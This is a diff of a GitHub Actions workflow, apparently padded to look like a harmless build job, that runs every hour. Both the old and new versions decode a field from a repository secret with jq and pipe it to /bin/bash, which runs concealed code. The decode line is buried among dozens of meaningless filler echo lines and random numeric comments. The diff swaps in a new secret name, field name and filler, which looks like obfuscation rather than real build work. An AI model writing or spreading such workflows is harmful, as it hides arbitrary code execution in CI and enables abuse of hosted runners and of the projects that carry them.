@@ -1,38 +1,38 @@
-name: xianzuna9631 #23793
-on: #7874
-  workflow_dispatch: #23588
-  schedule: #24737
-    - cron: '51 * * * *' #25816
-jobs: #20563
-  build: #5041
-    runs-on: ubuntu-latest #9675
-    steps: #1986
-      - uses: actions/checkout@v4 #29160
-      - name: xianzuna9631 #15453
-        env: #22397
-          i19161: ${{ secrets.i19161 }} #27867
+name: xianzuna9631 #23845
+on: #29823
+  workflow_dispatch: #13827
+  schedule: #18617
+    - cron: '43 * * * *' #29029
+jobs: #27365
+  build: #23926
+    runs-on: ubuntu-latest #21819
+    steps: #19516
+      - uses: actions/checkout@v4 #32267
+      - name: xianzuna9631 #9298
+        env: #30426
+          i15: ${{ secrets.i15 }} #8447
         run: |
-          for i in 994 4679 24637; do echo "Loop "; done
+          for i in 18940 30460 22863; do echo "Loop "; done
           sleep 0.1 2>/dev/null || true
-          echo $i19161 | jq -r .c4615 | /bin/bash #11559
+          echo $i15 | jq -r .n27306 | /bin/bash #4359
+          echo "String slice: str=abcdef; echo \${str:0:3}"
           echo "Version: $((1 + RANDOM % 5))"
+          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
+          echo "Command chain: true && echo 'A' || echo 'B'"
+          : ' Another single-line comment '
           echo "Redirect mock: echo data > /dev/null 2>&1"
-          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
-          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
-          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          for i in 1 2 3; do echo "Loop $i"; done
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
-          echo "Var op: v=1; echo \$((v+1))"
-          echo "Arithmetic: $(( (RANDOM % 5) * 10 ))"
-          echo "Build $(date +%s)"
-          if [ -x /bin/ls ]; then echo "LS executable"; fi
-          echo "Trap mock: trap 'echo TRAP' EXIT"
-          echo "Exit 0 test: exit 0 || true"
-          echo "Time diff mock: echo \$SECONDS"
-          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          sleep 0.1 2>/dev/null || true
           echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
-          test -d /tmp && echo "Tmp dir exists"
-          echo "Subshell: (echo subshell)"
+          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
+          echo "Dir: $(pwd)"
+          echo "Test file type: [ -f /etc/passwd ] && echo File"
+          echo "Read mock: read -p 'Prompt' var <<< 'input'"
           echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
+          echo "Export mock: export VAR=test"
+          echo "Date only: $(date +%F)"
+          echo "Time diff mock: echo \$SECONDS"
+          echo "Home dir: $(echo ~)"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          echo "Brace exp: echo file_{1..3}.txt"
